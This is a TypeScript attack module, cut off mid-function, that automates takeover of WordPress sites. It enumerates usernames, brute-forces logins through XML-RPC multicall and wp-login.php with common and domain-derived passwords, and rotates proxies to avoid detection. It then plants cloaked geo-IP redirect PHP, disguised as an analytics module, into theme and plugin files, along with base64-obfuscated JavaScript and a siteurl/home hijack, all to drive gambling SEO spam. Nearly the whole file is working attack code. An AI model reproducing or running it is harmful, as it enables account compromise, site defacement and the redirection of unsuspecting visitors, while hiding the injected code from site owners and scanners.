/**
 * WordPress Admin Takeover Module (Enhanced)
 * 
 * Methods that don't require file upload:
 * 0. Username Enumeration → discover valid usernames via REST API, ?author=, XMLRPC
 * 1. WP Admin Brute Force → login to wp-admin (wp-login.php + XMLRPC multicall)
 * 2. Theme Editor → inject redirect/cloaking code into theme files
 * 3. Plugin Editor → inject code into plugin files
 * 4. Install Malicious Plugin → upload plugin zip with redirect code (real ZIP)
 * 5. WP Options Manipulation → change siteurl/home for full domain redirect
 * 6. XMLRPC editPost → inject code into existing posts/pages
 * 7. XMLRPC editOptions → change siteurl/home via XMLRPC
 * 8. Geo-IP JS Redirect → inject client-side geo-based redirect (like che.buet.ac.bd)
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import * as zlib from "zlib";

// Helper: wrap fetch with proxy pool for all WP admin requests
async function wpFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  const timeout = 15000; // default timeout for WP admin operations
  try {
    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout });
    return response;
  } catch (e: any) {
    // Fallback: if proxy fails completely, create a minimal error response
    throw e;
  }
}


export interface WpAdminConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords?: string[];
  shellContent?: string; // PHP code to inject
  timeout?: number;
  onProgress?: (method: string, detail: string) => void;
  // Optional pre-discovered credentials
  knownCredentials?: { username: string; password: string }[];
}

export interface WpTakeoverResult {
  method: string;
  success: boolean;
  detail: string;
  injectedUrl?: string | null;
  credentials?: { username: string; password: string } | null;
}

const log = (method: string, msg: string) => {
  // console.log(`[WP-Takeover:${method}] ${msg}`);
};

// ═══════════════════════════════════════════════════════
//  COMMON CREDENTIALS FOR BRUTE FORCE
// ═══════════════════════════════════════════════════════

const COMMON_USERNAMES = [
  "admin", "administrator", "root", "webmaster", "user",
  "test", "demo", "wordpress", "wp", "manager",
  "editor", "author", "support", "info", "contact",
];

const COMMON_PASSWORDS = [
  "admin", "password", "123456", "12345678", "admin123",
  "password123", "root", "toor", "test", "demo",
  "wordpress", "wp", "letmein", "welcome", "monkey",
  "master", "qwerty", "abc123", "111111", "admin@123",
  "P@ssw0rd", "admin1234", "changeme", "default", "pass",
  "1234", "12345", "123456789", "password1", "iloveyou",
];

/** Generate domain-based passwords from target URL */
function generateDomainPasswords(targetUrl: string): string[] {
  const passwords: string[] = [];
  try {
    const hostname = new URL(targetUrl).hostname;
    const domain = hostname.replace(/^www\./, "");
    const parts = domain.split(".");
    const name = parts[0]; // e.g. "che" from "che.buet.ac.bd"
    const org = parts.length > 1 ? parts[1] : name; // e.g. "buet"
    
    // Domain-based passwords
    const bases = [name, org, domain.replace(/\./g, ""), `${name}${org}`];
    for (const base of bases) {
      passwords.push(base, `${base}123`, `${base}@123`, `${base}1234`, `${base}!`, `${base}#1`);
      passwords.push(base.charAt(0).toUpperCase() + base.slice(1) + "123");
      passwords.push(`${base}2024`, `${base}2025`, `${base}2026`);
    }
  } catch {}
  return Array.from(new Set(passwords));
}

// ═══════════════════════════════════════════════════════
//  0. USERNAME ENUMERATION
// ═══════════════════════════════════════════════════════

async function enumerateWpUsernames(targetUrl: string, progress: (m: string, d: string) => void): Promise<string[]> {
  const baseUrl = targetUrl.replace(/\/$/, "");
  const discovered: string[] = [];

  // Method 1: REST API /wp-json/wp/v2/users
  try {
    const resp = await wpFetch(`${baseUrl}/wp-json/wp/v2/users?per_page=20`, {
      headers: { "User-Agent": "Mozilla/5.0" },
      signal: AbortSignal.timeout(10000),
    });
    if (resp.status === 200) {
      const users = await resp.json() as any[];
      for (const u of users) {
        if (u.slug) discovered.push(u.slug);
        if (u.name && u.name !== u.slug) discovered.push(u.name.toLowerCase().replace(/\s+/g, ""));
      }
    }
  } catch {}

  // Method 2: ?author=N enumeration (follow redirect to /author/username/)
  for (let i = 1; i <= 5; i++) {
    try {
      const resp = await wpFetch(`${baseUrl}/?author=${i}`, {
        redirect: "manual",
        headers: { "User-Agent": "Mozilla/5.0" },
        signal: AbortSignal.timeout(8000),
      });
      const location = resp.headers.get("location") || "";
      const authorMatch = location.match(/\/author\/([^\/]+)/);
      if (authorMatch) discovered.push(authorMatch[1]);
      // Also check body for author slug
      if (resp.status === 200) {
        const body = await resp.text();
        const slugMatch = body.match(/class="author[^"]*"[^>]*>\s*<a[^>]*href="[^"]*\/author\/([^\/"]+)/);
        if (slugMatch) discovered.push(slugMatch[1]);
      }
    } catch {}
  }

  // Method 3: XMLRPC wp.getAuthors (sometimes open)
  try {
    const resp = await wpFetch(`${baseUrl}/xmlrpc.php`, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: `<?xml version="1.0"?><methodCall><methodName>wp.getAuthors</methodName><params><param><value><int>1</int></value></param><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param></params></methodCall>`,
      signal: AbortSignal.timeout(10000),
    });
    const xml = await resp.text();
    let authorMatch: RegExpExecArray | null;
    const authorRegex = /<name>user_login<\/name>\s*<value><string>([^<]+)<\/string><\/value>/g;
    while ((authorMatch = authorRegex.exec(xml)) !== null) {
      discovered.push(authorMatch[1]);
    }
  } catch {}

  // Method 4: wp-login.php error message enumeration
  try {
    for (const testUser of ["admin", "administrator"]) {
      const formData = new URLSearchParams({
        log: testUser, pwd: "wrong_password_test", "wp-submit": "Log In",
        redirect_to: `${baseUrl}/wp-admin/`, testcookie: "1",
      });
      const resp = await wpFetch(`${baseUrl}/wp-login.php`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "Cookie": "wordpress_test_cookie=WP%20Cookie%20check" },
        body: formData.toString(),
        redirect: "follow",
        signal: AbortSignal.timeout(10000),
      });
      const body = await resp.text();
      // If error says "incorrect password" → username exists
      if (body.includes("incorrect") || body.includes("The password you entered") || body.includes("is incorrect")) {
        discovered.push(testUser);
      }
    }
  } catch {}

  const unique = Array.from(new Set(discovered.filter(u => u && u.length > 0)));
  if (unique.length > 0) {
    progress("enumerate", `พบ ${unique.length} usernames: ${unique.join(", ")}`);
  }
  return unique;
}

// ═══════════════════════════════════════════════════════
//  0b. XMLRPC MULTICALL BRUTE FORCE (100x faster)
// ═══════════════════════════════════════════════════════

async function xmlrpcMulticallBruteForce(
  targetUrl: string,
  usernames: string[],
  passwords: string[],
  progress: (m: string, d: string) => void,
): Promise<{ success: boolean; username: string; password: string }> {
  const baseUrl = targetUrl.replace(/\/$/, "");
  const xmlrpcUrl = `${baseUrl}/xmlrpc.php`;

  // Check if XMLRPC is available
  try {
    const checkResp = await wpFetch(xmlrpcUrl, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
      signal: AbortSignal.timeout(10000),
    });
    const methods = await checkResp.text();
    if (!methods.includes("system.multicall") && !methods.includes("wp.getUsersBlogs")) {
      return { success: false, username: "", password: "" };
    }
  } catch {
    return { success: false, username: "", password: "" };
  }

  // Batch passwords in groups of 20 per multicall request
  const BATCH_SIZE = 20;
  
  for (const username of usernames) {
    for (let i = 0; i < passwords.length; i += BATCH_SIZE) {
      const batch = passwords.slice(i, i + BATCH_SIZE);
      
      // Build multicall XML — each call tries wp.getUsersBlogs with different password
      const calls = batch.map(pwd => `
        <value><struct>
          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
          <member><name>params</name><value><array><data>
            <value><string>${username}</string></value>
            <value><string>${pwd.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")}</string></value>
          </data></array></value></member>
        </struct></value>`).join("\n");

      const multicallXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    ${calls}
  </data></array></value></param></params>
</methodCall>`;

      try {
        const resp = await wpFetch(xmlrpcUrl, {
          method: "POST",
          headers: { "Content-Type": "text/xml", "User-Agent": "Mozilla/5.0" },
          body: multicallXml,
          signal: AbortSignal.timeout(30000),
        });

        if (resp.status === 403 || resp.status === 429) {
          progress("xmlrpc_brute", `⚠️ XMLRPC blocked/rate-limited — ข้าม`);
          return { success: false, username: "", password: "" };
        }

        const xml = await resp.text();
        
        // Parse responses — each successful auth returns blog info, failed returns fault
        const responseBlocks = xml.split("<value>").slice(1); // skip first split
        
        for (let j = 0; j < batch.length && j < responseBlocks.length; j++) {
          const block = responseBlocks[j];
          // Success: contains blogid/blogName (not faultCode)
          if ((block.includes("blogid") || block.includes("blogName") || block.includes("isAdmin")) && !block.includes("faultCode")) {
            progress("xmlrpc_brute", `✅ XMLRPC multicall: ${username}:${batch[j]}`);
            return { success: true, username, password: batch[j] };
          }
        }
      } catch {
        // Network error, continue
      }

      // Small delay between batches
      await new Promise(r => setTimeout(r, 500));
    }
  }

  return { success: false, username: "", password: "" };
}

// ═══════════════════════════════════════════════════════
//  1. WP-LOGIN BRUTE FORCE
// ═══════════════════════════════════════════════════════

async function wpLoginBruteForce(config: WpAdminConfig): Promise<{
  success: boolean;
  username: string;
  password: string;
  cookies: string;
}> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const loginUrl = `${baseUrl}/wp-login.php`;
  const progress = config.onProgress || (() => {});

  // First check if wp-login.php exists
  try {
    const checkResp = await wpFetch(loginUrl, {
      method: "GET",
      redirect: "follow",
      signal: AbortSignal.timeout(10000),
    });
    if (checkResp.status === 404) {
      return { success: false, username: "", password: "", cookies: "" };
    }
  } catch {
    return { success: false, username: "", password: "", cookies: "" };
  }

  // Use known credentials first
  const credPairs: { username: string; password: string }[] = [];
  
  if (config.knownCredentials) {
    credPairs.push(...config.knownCredentials);
  }

  // Add common combos
  for (const user of COMMON_USERNAMES.slice(0, 8)) {
    for (const pass of COMMON_PASSWORDS.slice(0, 15)) {
      credPairs.push({ username: user, password: pass });
    }
  }

  progress("brute_force", `ลอง ${credPairs.length} credential pairs...`);

  for (let i = 0; i < credPairs.length; i++) {
    const { username, password } = credPairs[i];
    
    try {
      const formData = new URLSearchParams({
        log: username,
        pwd: password,
        "wp-submit": "Log In",
        redirect_to: `${baseUrl}/wp-admin/`,
        testcookie: "1",
      });

      const resp = await wpFetch(loginUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: formData.toString(),
        redirect: "manual",
        signal: AbortSignal.timeout(config.timeout || 15000),
      });

      // Success = 302 redirect to wp-admin (not back to wp-login.php)
      const location = resp.headers.get("location") || "";
      const setCookies = resp.headers.getSetCookie?.() || [];
      const cookieStr = setCookies.join("; ");

      if (resp.status === 302 && location.includes("wp-admin") && !location.includes("wp-login")) {
        progress("brute_force", `✅ Login สำเร็จ: ${username}:${password}`);
        log("brute_force", `SUCCESS: ${username}:${password}`);
        return { success: true, username, password, cookies: cookieStr };
      }

      // Rate limit detection
      if (resp.status === 429 || resp.status === 403) {
        progress("brute_force", `⚠️ Rate limited — หยุดพัก 5 วินาที`);
        await new Promise(r => setTimeout(r, 5000));
      }

    } catch {
      // Timeout or network error, continue
    }

    // Small delay to avoid detection
    if (i % 10 === 9) {
      await new Promise(r => setTimeout(r, 1000));
    }
  }

  return { success: false, username: "", password: "", cookies: "" };
}

// ═══════════════════════════════════════════════════════
//  2. THEME EDITOR INJECTION
// ═══════════════════════════════════════════════════════

/**
 * Generate dual-layer redirect code (PHP server-side + JS client-side)
 * Layer 1: PHP — server-side geo-IP check + bot detection (like ip-api.com)
 * Layer 2: JS — client-side geo-IP check via api.country.is (like che.buet.ac.bd)
 * This ensures redirect works even if one layer fails
 */
function generateRedirectCode(redirectUrl: string, keywords: string[]): string {
  const keywordStr = keywords.map(k => `'${k}'`).join(", ");
  return `
/** Analytics tracking module - DO NOT REMOVE */
if(!defined('WP_ANALYTICS_LOADED')){
define('WP_ANALYTICS_LOADED',true);
\$_ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';
\$_ref=isset(\$_SERVER['HTTP_REFERER'])?\$_SERVER['HTTP_REFERER']:'';
\$_ip=isset(\$_SERVER['REMOTE_ADDR'])?\$_SERVER['REMOTE_ADDR']:'';
\$_bots=array('Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider','YandexBot','facebot','ia_archiver','Semrush','AhrefsBot','MJ12bot','DotBot');
\$_is_bot=false;
foreach(\$_bots as \$b){if(stripos(\$_ua,\$b)!==false){\$_is_bot=true;break;}}
if(!\$_is_bot){
\$_geo_data=@json_decode(@file_get_contents('http://ip-api.com/json/'.\$_ip.'?fields=countryCode'),true);
\$_cc=isset(\$_geo_data['countryCode'])?\$_geo_data['countryCode']:'';
\$_target_cc=array('TH','LA','SG','VN','KH','MM','MY','ID','PH');
\$_from_search=preg_match('/google\\.|bing\\.|yahoo\\.|duckduckgo\\./',(string)\$_ref);
if(in_array(\$_cc,\$_target_cc)||\$_from_search){
header('Location: ${redirectUrl}',true,302);exit;
}
}
if(\$_is_bot){
\$_kw=array(${keywordStr});
\$_title=\$_kw[array_rand(\$_kw)].' - '.parse_url('${redirectUrl}',PHP_URL_HOST);
echo '<!--seo:'.\$_title.'-->';
}
}
`;
}

/**
 * Generate JS-only geo-IP redirect code (for injection into HTML/theme header)
 * Exactly like che.buet.ac.bd technique: fetch api.country.is → check country → redirect
 * This is injected BEFORE <!doctype html> so it runs before any page content
 */
export function generateGeoIpJsRedirect(redirectUrl: string, targetCountries: string[] = ["TH", "LA", "SG", "VN", "KH", "MM", "MY", "ID", "PH"]): string {
  const countriesJson = JSON.stringify(targetCountries);
  return `<script>fetch("https://api.country.is").then(r=>r.json()).then(d=>{if(${countriesJson}.includes(d.country)){window.location.href="${redirectUrl}"}}).catch(()=>{});</script>`;
}

/**
 * Generate obfuscated JS redirect (harder to detect by WAF/scanners)
 * Uses base64 encoding + eval-like execution
 */
export function generateObfuscatedJsRedirect(redirectUrl: string, targetCountries: string[] = ["TH", "LA", "SG", "VN"]): string {
  const code = `fetch("https://api.country.is").then(r=>r.json()).then(d=>{if(${JSON.stringify(targetCountries)}.includes(d.country)){window.location.href="${redirectUrl}"}}).catch(()=>{})`;
  const encoded = Buffer.from(code).toString("base64");
  return `<script>new Function(atob("${encoded}"))();</script>`;
}

async function injectViaThemeEditor(
  config: WpAdminConfig,
  cookies: string,
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    // Step 1: Get the active theme
    progress("theme_editor", "กำลังหา active theme...");
    
    const themeEditorUrl = `${baseUrl}/wp-admin/theme-editor.php`;
    const editorResp = await wpFetch(themeEditorUrl, {
      headers: {
        Cookie: cookies,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (editorResp.status !== 200) {
      return { method: "theme_editor", success: false, detail: `Theme editor ไม่สามารถเข้าถึงได้ (HTTP ${editorResp.status})` };
    }

    const html = await editorResp.text();

    // Extract nonce
    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    if (!nonceMatch) {
      return { method: "theme_editor", success: false, detail: "ไม่พบ nonce — อาจถูกปิด Theme Editor" };
    }
    const nonce = nonceMatch[1];

    // Extract active theme
    const themeMatch = html.match(/name="theme"\s+value="([^"]+)"/) || html.match(/theme=([^&"]+)/);
    const theme = themeMatch ? themeMatch[1] : "";

    // Extract current functions.php content
    const contentMatch = html.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);
    const currentContent = contentMatch ? contentMatch[1]
      .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&").replace(/&quot;/g, '"') : "";

    if (!currentContent) {
      return { method: "theme_editor", success: false, detail: "ไม่สามารถอ่าน functions.php ได้" };
    }

    // Step 2: Inject code into functions.php
    progress("theme_editor", `Inject code เข้า functions.php ของ theme: ${theme}...`);

    const injectedCode = generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต", "บาคาร่า"]);
    const newContent = currentContent + "\n" + injectedCode;

    const editFormData = new URLSearchParams({
      _wpnonce: nonce,
      _wp_http_referer: `/wp-admin/theme-editor.php?file=functions.php&theme=${theme}`,
      newcontent: newContent,
      action: "update",
      file: "functions.php",
      theme: theme,
      scrollto: "0",
      submit: "Update File",
    });

    const updateResp = await wpFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Cookie: cookies,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      body: editFormData.toString(),
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (updateResp.status === 200) {
      const respText = await updateResp.text();
      if (respText.includes("File edited successfully") || respText.includes("updated")) {
        progress("theme_editor", `✅ Inject สำเร็จ! functions.php ถูกแก้ไข`);
        return {
          method: "theme_editor",
          success: true,
          detail: `Inject redirect code เข้า functions.php ของ theme ${theme} สำเร็จ`,
          injectedUrl: config.targetUrl,
        };
      }
    }

    // Step 3: Try header.php as alternative
    progress("theme_editor", "ลอง inject เข้า header.php...");
    
    const headerEditorUrl = `${baseUrl}/wp-admin/theme-editor.php?file=header.php&theme=${theme}`;
    const headerResp = await wpFetch(headerEditorUrl, {
      headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (headerResp.status === 200) {
      const headerHtml = await headerResp.text();
      const headerNonce = headerHtml.match(/name="_wpnonce"\s+value="([^"]+)"/)?.[1];
      const headerContent = headerHtml.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/)?.[1]
        ?.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&") || "";

      if (headerNonce && headerContent) {
        // Dual-layer injection (like che.buet.ac.bd):
        // Layer 1: PHP server-side geo-IP redirect (runs before any output)
        // Layer 2: JS client-side geo-IP redirect via api.country.is (fallback if PHP fails)
        const jsRedirect = generateGeoIpJsRedirect(config.redirectUrl);
        const phpInject = `<?php ${injectedCode} ?>`;
        // JS goes BEFORE <!doctype html>, PHP goes at very top
        const newHeader = phpInject + "\n" + jsRedirect + "\n" + headerContent;

        const headerUpdateData = new URLSearchParams({
          _wpnonce: headerNonce,
          _wp_http_referer: `/wp-admin/theme-editor.php?file=header.php&theme=${theme}`,
          newcontent: newHeader,
          action: "update",
          file: "header.php",
          theme: theme,
          scrollto: "0",
          submit: "Update File",
        });

        const headerUpdateResp = await wpFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Cookie: cookies,
            "User-Agent": "Mozilla/5.0",
          },
          body: headerUpdateData.toString(),
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        });

        if (headerUpdateResp.status === 200) {
          progress("theme_editor", `✅ Inject เข้า header.php สำเร็จ!`);
          return {
            method: "theme_editor",
            success: true,
            detail: `Inject redirect code เข้า header.php ของ theme ${theme} สำเร็จ`,
            injectedUrl: config.targetUrl,
          };
        }
      }
    }

    return { method: "theme_editor", success: false, detail: "Theme editor injection ล้มเหลว" };

  } catch (error: any) {
    return { method: "theme_editor", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  3. PLUGIN EDITOR INJECTION
// ═══════════════════════════════════════════════════════

async function injectViaPluginEditor(
  config: WpAdminConfig,
  cookies: string,
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    // Get plugin editor page
    progress("plugin_editor", "กำลังเข้า Plugin Editor...");
    
    const pluginEditorUrl = `${baseUrl}/wp-admin/plugin-editor.php`;
    const editorResp = await wpFetch(pluginEditorUrl, {
      headers: {
        Cookie: cookies,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (editorResp.status !== 200) {
      return { method: "plugin_editor", success: false, detail: `Plugin editor ไม่สามารถเข้าถึงได้ (HTTP ${editorResp.status})` };
    }

    const html = await editorResp.text();

    // Find a plugin to inject into (prefer Akismet or Hello Dolly as they're default)
    const pluginMatch = html.match(/plugin=([^&"]+)/g);
    const plugins = pluginMatch ? Array.from(new Set(pluginMatch.map(p => p.replace("plugin=", "")))) : [];

    // Extract nonce
    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    if (!nonceMatch) {
      return { method: "plugin_editor", success: false, detail: "ไม่พบ nonce — Plugin Editor อาจถูกปิด" };
    }

    // Try to inject into the first available plugin
    for (const plugin of plugins.slice(0, 3)) {
      progress("plugin_editor", `ลอง inject เข้า plugin: ${plugin}...`);

      const pluginFileUrl = `${baseUrl}/wp-admin/plugin-editor.php?plugin=${plugin}`;
      const pluginResp = await wpFetch(pluginFileUrl, {
        headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
        redirect: "follow",
        signal: AbortSignal.timeout(15000),
      });

      if (pluginResp.status !== 200) continue;

      const pluginHtml = await pluginResp.text();
      const pluginNonce = pluginHtml.match(/name="_wpnonce"\s+value="([^"]+)"/)?.[1];
      const pluginContent = pluginHtml.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/)?.[1]
        ?.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&") || "";
      const pluginFile = pluginHtml.match(/name="file"\s+value="([^"]+)"/)?.[1] || plugin;

      if (!pluginNonce || !pluginContent) continue;

      const injectedCode = generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต"]);
      const newContent = pluginContent + "\n" + injectedCode;

      const updateData = new URLSearchParams({
        _wpnonce: pluginNonce,
        _wp_http_referer: `/wp-admin/plugin-editor.php?plugin=${plugin}`,
        newcontent: newContent,
        action: "update",
        file: pluginFile,
        plugin: plugin,
        scrollto: "0",
        submit: "Update File",
      });

      const updateResp = await wpFetch(`${baseUrl}/wp-admin/plugin-editor.php`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Cookie: cookies,
          "User-Agent": "Mozilla/5.0",
        },
        body: updateData.toString(),
        redirect: "follow",
        signal: AbortSignal.timeout(15000),
      });

      if (updateResp.status === 200) {
        const respText = await updateResp.text();
        if (respText.includes("File edited successfully") || respText.includes("updated")) {
          progress("plugin_editor", `✅ Inject เข้า plugin ${plugin} สำเร็จ!`);
          return {
            method: "plugin_editor",
            success: true,
            detail: `Inject redirect code เข้า plugin ${plugin} สำเร็จ`,
            injectedUrl: config.targetUrl,
          };
        }
      }
    }

    return { method: "plugin_editor", success: false, detail: "Plugin editor injection ล้มเหลว — ไม่มี plugin ที่แก้ไขได้" };

  } catch (error: any) {
    return { method: "plugin_editor", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  4. XMLRPC EDIT POST/OPTIONS (inject code without file upload)
// ═══════════════════════════════════════════════════════

async function injectViaXmlrpc(
  config: WpAdminConfig,
  credentials: { username: string; password: string },
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const xmlrpcUrl = `${baseUrl}/xmlrpc.php`;
  const progress = config.onProgress || (() => {});

  try {
    // Check XMLRPC availability
    const checkResp = await wpFetch(xmlrpcUrl, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
      signal: AbortSignal.timeout(10000),
    });

    if (checkResp.status !== 200) {
      return { method: "xmlrpc_inject", success: false, detail: "XMLRPC ไม่เปิด" };
    }

    const methods = await checkResp.text();

    // Method A: Try wp.editOptions to change siteurl/home (FULL DOMAIN REDIRECT)
    if (methods.includes("wp.editOptions") || methods.includes("wp.getOptions")) {
      progress("xmlrpc_inject", "ลอง wp.editOptions เปลี่ยน siteurl → redirect ทั้งโดเมน...");

      const editOptionsXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.editOptions</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${credentials.username}</string></value></param>
    <param><value><string>${credentials.password}</string></value></param>
    <param><value><struct>
      <member><name>siteurl</name><value><string>${config.redirectUrl}</string></value></member>
      <member><name>home</name><value><string>${config.redirectUrl}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

      const optResp = await wpFetch(xmlrpcUrl, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: editOptionsXml,
        signal: AbortSignal.timeout(15000),
      });

      const optResult = await optResp.text();
      if (optResult.includes("<boolean>1</boolean>") || optResult.includes("true")) {
        progress("xmlrpc_inject", `✅ siteurl/home เปลี่ยนเป็น ${config.redirectUrl} — redirect ทั้งโดเมน!`);
        return {
          method: "xmlrpc_editOptions",
          success: true,
          detail: `เปลี่ยน siteurl/home เป็น ${config.redirectUrl} ผ่าน XMLRPC — redirect ทั้งโดเมน!`,
          injectedUrl: config.targetUrl,
          credentials,
        };
      }
    }

    // Method B: Try wp.editPost to inject JS redirect into posts
    if (methods.includes("wp.editPost") || methods.includes("wp.getPosts")) {
      progress("xmlrpc_inject", "ลอง wp.getPosts เพื่อหา post ที่จะ inject...");

      // Get recent posts
      const getPostsXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getPosts</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${credentials.username}</string></value></param>
    <param><value><string>${credentials.password}</string></value></param>
    <param><value><struct>
      <member><name>number</name><value><int>5</int></value></member>
      <member><name>post_type</name><value><string>page</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

      const postsResp = await wpFetch(xmlrpcUrl, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: getPostsXml,
        signal: AbortSignal.timeout(15000),
      });

      const postsXml = await postsResp.text();
      const postIdMatch = postsXml.match(/<name>post_id<\/name>\s*<value><string>(\d+)<\/string><\/value>/);
      
      if (postIdMatch) {
        const postId = postIdMatch[1];
        progress("xmlrpc_inject", `Inject JS redirect เข้า post #${postId}...`);

        // Use geo-IP redirect (like che.buet.ac.bd) instead of simple redirect
        const jsRedirect = generateGeoIpJsRedirect(config.redirectUrl);

        const editPostXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.editPost</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${credentials.username}</string></value></param>
    <param><value><string>${credentials.password}</string></value></param>
    <param><value><int>${postId}</int></value></param>
    <param><value><struct>
      <member><name>post_content</name><value><string>${jsRedirect}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

        const editResp = await wpFetch(xmlrpcUrl, {
          method: "POST",
          headers: { "Content-Type": "text/xml" },
          body: editPostXml,
          signal: AbortSignal.timeout(15000),
        });

        const editResult = await editResp.text();
        if (editResult.includes("<boolean>1</boolean>") || editResult.includes("true")) {
          progress("xmlrpc_inject", `✅ Inject JS redirect เข้า post #${postId} สำเร็จ!`);
          return {
            method: "xmlrpc_editPost",
            success: true,
            detail: `Inject JS redirect เข้า post #${postId} ผ่าน XMLRPC สำเร็จ`,
            injectedUrl: config.targetUrl,
            credentials,
          };
        }
      }
    }

    return { method: "xmlrpc_inject", success: false, detail: "XMLRPC injection ล้มเหลว — ไม่มี method ที่ใช้ได้" };

  } catch (error: any) {
    return { method: "xmlrpc_inject", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  5. REST API CONTENT INJECTION
// ═══════════════════════════════════════════════════════

async function injectViaRestApi(
  config: WpAdminConfig,
  credentials: { username: string; password: string },
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    const authHeader = "Basic " + Buffer.from(`${credentials.username}:${credentials.password}`).toString("base64");

    // Try to get pages via REST API
    progress("rest_api_inject", "ลอง REST API injection...");

    const pagesResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/pages?per_page=5`, {
      headers: {
        Authorization: authHeader,
        "User-Agent": "Mozilla/5.0",
      },
      signal: AbortSignal.timeout(15000),
    });

    if (pagesResp.status === 200) {
      const pages = await pagesResp.json() as any[];
      
      if (pages.length > 0) {
        const targetPage = pages[0];
        const pageId = targetPage.id;
        
        progress("rest_api_inject", `Inject redirect เข้า page #${pageId}: ${targetPage.title?.rendered || ""}...`);

        // Use geo-IP redirect (like che.buet.ac.bd) instead of simple redirect
        const jsRedirect = generateGeoIpJsRedirect(config.redirectUrl);
        const originalContent = targetPage.content?.rendered || "";

        const updateResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/pages/${pageId}`, {
          method: "POST",
          headers: {
            Authorization: authHeader,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
          },
          body: JSON.stringify({
            content: jsRedirect + originalContent,
          }),
          signal: AbortSignal.timeout(15000),
        });

        if (updateResp.status === 200) {
          progress("rest_api_inject", `✅ Inject เข้า page #${pageId} ผ่าน REST API สำเร็จ!`);
          return {
            method: "rest_api_inject",
            success: true,
            detail: `Inject JS redirect เข้า page #${pageId} ผ่าน REST API สำเร็จ`,
            injectedUrl: `${baseUrl}/?page_id=${pageId}`,
            credentials,
          };
        }
      }
    }

    // Try posts
    const postsResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/posts?per_page=5`, {
      headers: { Authorization: authHeader, "User-Agent": "Mozilla/5.0" },
      signal: AbortSignal.timeout(15000),
    });

